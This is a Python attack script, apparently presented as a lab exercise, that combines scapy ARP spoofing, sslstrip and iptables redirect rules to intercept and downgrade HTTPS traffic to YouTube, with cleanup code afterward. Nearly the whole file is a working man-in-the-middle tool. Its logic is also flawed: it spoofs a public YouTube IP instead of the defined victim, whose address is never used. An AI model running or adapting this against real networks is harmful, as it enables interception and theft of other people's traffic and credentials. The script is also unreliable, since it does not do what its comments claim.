import subprocess
import time
import scapy.all as scapy
from scapy.layers.l2 import getmacbyip
import socket

class LabSpoofingSSL:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip  # IP da vítima (navegador)
        self.gateway_ip = gateway_ip  # IP do gateway
        self.attacker_ip = socket.gethostbyname(socket.gethostname())  # IP da máquina atacante

    def execute_command(self, command):
        """Executa um comando no sistema e trata exceções."""
        try:
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Erro ao executar comando: {e}")

    def start_sslstrip(self):
        """Inicia o sslstrip em segundo plano."""
        print("Iniciando o sslstrip...")
        self.execute_command("sudo sslstrip -l 8080 &")  # O "&" faz o comando rodar em segundo plano

    def configure_iptables(self):
        """Configura iptables para redirecionar o tráfego do YouTube."""
        print("Configurando iptables...")
        self.execute_command("sudo iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -m string --string 'Host: www.youtube.com' --algo bm -j REDIRECT --to-port 8080")
        self.execute_command("sudo iptables -t nat -A PREROUTING -p tcp -m tcp --dport 443 -m string --string 'Host: www.youtube.com' --algo bm -j REDIRECT --to-port 8080")

    def spoof_arp(self, target_ip, spoof_ip):
        """Envia pacotes ARP spoofing."""
        target_mac = getmacbyip(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
        scapy.send(packet, verbose=False)

    def restore_arp(self, target_ip, source_ip):
        """Restaura a tabela ARP para a configuração original."""
        target_mac = getmacbyip(target_ip)
        source_mac = getmacbyip(source_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

    def remove_iptables_rules(self):
        """Remove as regras do iptables após o teste."""
        print("Removendo regras do iptables...")
        self.execute_command("sudo iptables -t nat -D PREROUTING -p tcp -m tcp --dport 80 -m string --string 'Host: www.youtube.com' --algo bm -j REDIRECT --to-port 8080")
        self.execute_command("sudo iptables -t nat -D PREROUTING -p tcp -m tcp --dport 443 -m string --string 'Host: www.youtube.com' --algo bm -j REDIRECT --to-port 8080")

    def run_test(self, duration=60):
        """Executa o ataque simulado por um período especificado."""
        try:
            print("Iniciando ARP Spoofing para o IP do YouTube...")
            # IP do YouTube (exemplo, deve ser o IP real do YouTube que você deseja usar)
            youtube_ip = "172.217.0.0"  # IP do YouTube, pode variar
            self.spoof_arp(youtube_ip, self.gateway_ip)  # Spoofing do IP do YouTube
            self.spoof_arp(self.gateway_ip, youtube_ip)  # Spoofing do gateway

            # Iniciar sslstrip e configurar iptables
            self.start_sslstrip()
            self.configure_iptables()

            print("Ataque em execução...")

            # Mantém o ataque ativo pelo tempo especificado
            time.sleep(duration)
        except KeyboardInterrupt:
            print("Ataque interrompido pelo usuário.")
        finally:
            # Restaurar ARP e remover regras do iptables
            self.restore_arp(youtube_ip, self.gateway_ip)
            self.restore_arp(self.gateway_ip, youtube_ip)
            self.remove_iptables_rules()
            print("Rede restaurada.")

# Exemplo de uso da classe
if __name__ == "__main__":
    target_ip = "192.168.1.5"  # IP da vítima (navegador)
    gateway_ip = "192.168.1.1"  # IP do gateway

    lab = LabSpoofingSSL(target_ip, gateway_ip)
    lab.run_test(60)  # Executa o teste por 60 segundos
